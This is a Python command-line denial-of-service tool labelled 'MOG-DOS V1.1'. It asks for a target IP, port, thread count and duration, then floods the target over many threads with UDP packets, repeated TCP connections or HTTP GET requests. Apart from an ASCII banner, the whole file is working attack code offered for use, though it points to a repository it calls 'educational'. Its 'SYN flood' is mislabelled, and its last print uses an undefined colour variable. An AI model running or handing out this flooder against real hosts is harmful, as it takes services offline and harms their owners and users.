import socket
import threading
import time
import random

DARK_PURPLE = "\033[35m" 
DARK_BLUE   = "\033[34m" 
RED         = "\033[31m"
GREEN       = "\033[32m"
YELLOW      = "\033[33m"
RESET       = "\033[0m" 

ASCII_ART = f"""{DARK_PURPLE}
███╗   ███╗ ██████╗  ██████╗       ██╗   ██╗ ██╗   ██╗
████╗ ████║██╔═══██╗██╔════╝       ██║   ██║███║  ███║
██╔████╔██║██║   ██║██║  ███╗█████╗██║   ██║╚██║  ╚██║
██║╚██╔╝██║██║   ██║██║   ██║╚════╝╚██╗ ██╔╝ ██║   ██║
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝       ╚████╔╝  ██║██╗██║
╚═╝     ╚═╝ ╚═════╝  ╚═════╝         ╚═══╝   ╚═╝╚═╝╚═╝
{RESET}"""

def udp_flood(target_ip, target_port, duration):
    """
    Sends UDP packets to the target IP and port for a specified duration.
    """
    start_time = time.time()
    client = None  
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = b'X' * random.randint(1024, 4096) # 1kb of data

        while time.time() - start_time < duration:
            try:
                client.sendto(bytes_to_send, (target_ip, target_port))
                print(f"{GREEN}UDP: Sent packet to {target_ip}:{target_port}{RESET}")
                time.sleep(0.00001)
            except socket.error as e:
                print(f"{RED}UDP Socket error: {e}{RESET}")
                break

    except Exception as e:
        print(f"{RED}UDP Error in thread: {e}{RESET}")
    finally:
        if client:
            client.close()

def tcp_syn_flood(target_ip, target_port, duration):
    """
    Attempts a TCP SYN flood attack (requires root/admin privileges in many cases).
    """
    start_time = time.time()
    client = None
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() - start_time < duration:
            try:
                client.connect((target_ip, target_port))
                print(f"{GREEN}TCP SYN: Attempted connection to {target_ip}:{target_port}{RESET}")
                client.close()
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                time.sleep(0.00001)
            except socket.error as e:
                print(f"{RED}TCP SYN Socket error: {e}{RESET}")
                break
    except Exception as e:
        print(f"{RED}TCP SYN Error in thread: {e}{RESET}")
    finally:
        if client:
            client.close()

def http_get_flood(target_ip, target_port, duration):
    """
    Sends HTTP GET requests to the target (basic).
    """
    start_time = time.time()
    client = None
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() - start_time < duration:
            try:
                client.connect((target_ip, target_port))
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
                client.sendall(request)
                print(f"{GREEN}HTTP GET: Sent request to {target_ip}:{target_port}{RESET}")
                client.close()
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(0.002)
            except socket.error as e:
                print(f"{RED}HTTP GET Socket error: {e}{RESET}")
                break
    except Exception as e:
        print(f"{RED}HTTP GET Error in thread: {e}{RESET}")
    finally:
        if client:
            client.close()

def start_attack(target_ip, target_port, num_threads, attack_type, duration):
    """
    Starts multiple threads for the specified attack type.
    """
    if attack_type == "udp":
        attack_function = udp_flood
    elif attack_type == "tcp":
        attack_function = tcp_syn_flood
    elif attack_type == "http":
        attack_function = http_get_flood
    else:
        print(f"{RED}Invalid attack type.{RESET}")
        return

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, duration))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"{YELLOW}Thread {i + 1} ({attack_type}) started.{RESET}")

    for thread in threads:
        thread.join()
    print(f"{BLUE}Attack finished.{RESET}")

if __name__ == "__main__":
    print(ASCII_ART) #show the ascii
    print(f"{DARK_BLUE}Made by @misterofgames_yt (MOG-DOS_V1.1) {RESET}")
    print(f"{YELLOW} MOG-DOS Project: https://github.com/MOG-Developing/DOS-ATTACK-educational {RESET}")
    target_ip = input(f"{GREEN}Enter the target IP address: {RESET}")
    target_port = int(input(f"{GREEN}Enter the target port: {RESET}"))
    num_threads = int(input(f"{GREEN}Enter the number of threads: {RESET}"))
    attack_type = input(f"{GREEN}Enter the attack type (udp, tcp, http): {RESET}").lower() #lowercase
    duration = int(input(f"{GREEN}Enter the attack duration in seconds: {RESET}") or "10") #default value 10 sec

    start_attack(target_ip, target_port, num_threads, attack_type, duration)
